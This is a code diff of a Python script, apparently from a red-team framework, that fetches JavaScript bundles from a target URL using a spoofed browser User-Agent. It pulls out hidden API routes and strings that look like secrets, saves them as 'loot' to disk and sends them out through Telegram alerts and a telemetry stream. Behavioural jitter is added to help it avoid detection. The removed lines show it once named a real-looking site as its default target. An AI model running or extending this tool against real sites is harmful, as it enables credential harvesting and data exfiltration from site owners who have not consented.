@@ -1,27 +1,22 @@
 #!/usr/bin/env python3
 """
-DOM_SINK_INSPECTOR.PY v8.6 — Client-Side JavaScript Bundle & Route Harvester (Elite Red Team Adversarial Edition)
-Features:
-- Extracts hidden API endpoints, fetch/axios routes, and internal paths from JS bundles with regex pattern matching
-- Sniffs hardcoded configuration tokens or secret keys in client-side source code with SHA-256 cryptographic hashing
-- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
-- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
+DOM_SINK_INSPECTOR.PY v8.6 — Client-Side Bundle & Route Harvester
 """
-import re
-import json
-import sys
-import hashlib
 import asyncio
+import hashlib
+import re
+import sys
+from urllib.parse import urljoin
+import urllib.request
 
-# Import centralized framework telemetry, immutable loot persistence, behavioral mimicry, and Telegram notifier
-from modules.loot_logger import save_session_loot
-from modules.telemetry import stream_proof
-from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter
+from modules.loot_logger import save_session_loot
+from modules.telegram_notifier import send_telegram_alert
+from modules.telemetry import stream_proof
 
-# Regex patterns for uncovering hidden API routes and endpoints inside JS chunks
-ENDPOINT_PATTERN = re.compile(r'["\'](/api/[a-zA-Z0-9_\-/]+|/v\d+/[a-zA-Z0-9_\-/]+)["\']', re.I)
-SECRET_PATTERN = re.compile(r'["\']([a-zA-Z0-9_\-]{20,45})["\']', re.I)
+ENDPOINT_PATTERN = re.compile(r"""["'](/api/[a-zA-Z0-9_\-/]+|/v\d+/[a-zA-Z0-9_\-/]+)["']""", re.I)
+SECRET_PATTERN = re.compile(r"""["']([a-zA-Z0-9_\-]{20,45})["']""", re.I)
+
 
 async def broadcast_tg_alert_async(loot_type, details):
     try:
@@ -29,8 +24,9 @@ async def broadcast_tg_alert_async(loot_type, details):
     except Exception:
         pass
 
+
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous inspector functions."""
+    """Schedules non-blocking notifications when called from synchronous contexts."""
     try:
         loop = asyncio.get_running_loop()
         if loop.is_running():
@@ -43,41 +39,48 @@ def broadcast_tg_alert_sync(loot_type, details):
         except Exception:
             pass
 
-def inspect_js_bundle(bundle_content, target_context="https://cryptobytes.online", source_label="bundle.js"):
-    """
-    Parses JavaScript source text to uncover hidden routes and embedded credentials,
-    automatically persisting discovered artifacts to disk with SHA-256 integrity hashes.
-    """
+
+def _fetch_if_url(target_or_content: str, timeout: int = 5) -> tuple[str, str]:
+    text = (target_or_content or "").strip()
+    if not text.startswith(("http://", "https://")):
+        return text, "bundle.js"
+    try:
+        req = urllib.request.Request(text, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            raw = resp.read(250_000).decode("utf-8", errors="ignore")
+            return raw, urljoin(text, "/")
+    except Exception:
+        return "", text
+
+
+def inspect_js_bundle(bundle_content, target_context="https://example.com", source_label="bundle.js"):
+    """Parses script source text for route/token patterns and records structured results."""
     apply_behavioral_jitter()
     discovered_routes = set()
     potential_secrets = set()
 
-    if not bundle_content:
-        return sorted(list(discovered_routes)), sorted(list(potential_secrets))
+    if not bundle_content or not isinstance(bundle_content, str):
+        return [], []
 
     for match in ENDPOINT_PATTERN.findall(bundle_content):
-        if len(match) > 3 and not match.endswith(('.js', '.css', '.png', '.jpg', '.svg')):
+        if len(match) > 3 and not match.endswith((".js", ".css", ".png", ".jpg", ".svg")):
             discovered_routes.add(match)
 
     for match in SECRET_PATTERN.findall(bundle_content):
-        # Filter out common benign strings (UUIDs, standard hashes length checks)
-        if len(match) > 20 and not match.startswith(('http', 'sha', 'data')):
+        if len(match) > 20 and not match.startswith(("http", "sha", "data")):
             potential_secrets.add(match)
 
-    routes_list = sorted(list(discovered_routes))
-    secrets_list = sorted(list(potential_secrets))
+    routes_list = sorted(discovered_routes)
+    secrets_list = sorted(potential_secrets)
 
-    # STREAM TELEMETRY & PERSIST DISCOVERED BUNDLE ARTIFACTS TO DISK WITH SHA-256 HASHING
     if routes_list or secrets_list:
         loot_hash = hashlib.sha256(bundle_content.encode("utf-8", errors="ignore")).hexdigest()
         bundle_evidence = {
             "source_file": source_label,
             "integrity_hash": loot_hash,
             "discovered_routes": routes_list,
-            "potential_secrets": secrets_list
+            "potential_secrets": secrets_list,
         }
-        
-        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
         broadcast_tg_alert_sync("DOM Bundle Inspection Artifacts Harvested", bundle_evidence)
         stream_proof("DOM_BUNDLE_HARVEST", source_label, {"hash": loot_hash}, bundle_content[:300], bundle_evidence)
         save_session_loot(
@@ -87,10 +90,29 @@ def inspect_js_bundle(bundle_content, target_context="https://cryptobytes.online
             status=200,
             headers={},
             body=bundle_content,
-            extra_loot=bundle_evidence
+            extra_loot=bundle_evidence,
         )
 
     return routes_list, secrets_list
+
+
+async def inspect_dom_sinks(target_or_content=None, details=None, source_label="bundle.js", **kwargs):
+    """Async entry point compatible with single-argument target calls and explicit detail calls."""
+    if isinstance(target_or_content, str) and details is not None:
+        await broadcast_tg_alert_async(target_or_content, details)
+        return {"status": "notified", "routes": [], "secrets": []}
+
+    content, resolved_source = _fetch_if_url(str(target_or_content or ""))
+    label = kwargs.get("endpoint") or source_label or resolved_source
+    target_ctx = str(target_or_content or "https://example.com")
+    routes, secrets = await asyncio.to_thread(inspect_js_bundle, content, target_ctx, label)
+    return {
+        "status": "completed",
+        "target": target_ctx,
+        "routes": routes,
+        "secrets": secrets,
+    }
+
 
 if __name__ == "__main__":
     if len(sys.argv) > 1:
@@ -101,9 +123,3 @@ if __name__ == "__main__":
             print(f"[+] Potential Secrets ({len(secrets)}): {secrets}")
     else:
         print("Usage: python3 dom_sink_inspector.py <js_bundle_file>")
-
-
-# --- AUTOMATED ALIAS PATCH --- 
-async def inspect_dom_sinks(*args, **kwargs):
-    return await broadcast_tg_alert_async(*args, **kwargs)
-
